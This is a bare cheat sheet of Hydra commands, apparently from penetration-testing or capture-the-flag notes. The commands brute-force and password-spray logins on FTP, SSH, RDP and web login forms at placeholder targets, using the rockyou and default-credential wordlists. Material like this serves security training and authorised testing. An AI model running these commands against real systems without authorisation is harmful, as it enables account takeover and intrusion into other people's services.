
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP ftp
```

```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt TARGET ftp
```

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://TARGET:80/ical_server.php
```

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://TARGET
```

```
hydra -l lol -P /usr/share/wordlists/rockyou.txt $IP ssh
```

```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt TARGET ftp
```

```
hydra -l eve -P wordlist  TARGET -t 4 ssh -V
```

```
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://TARGET
```

```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://TARGET
```

```
hydra -l itadmin -P /usr/share/wordlists/rockyou.txt -s 21 ftp://TARGET
```

```
hydra -l user -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

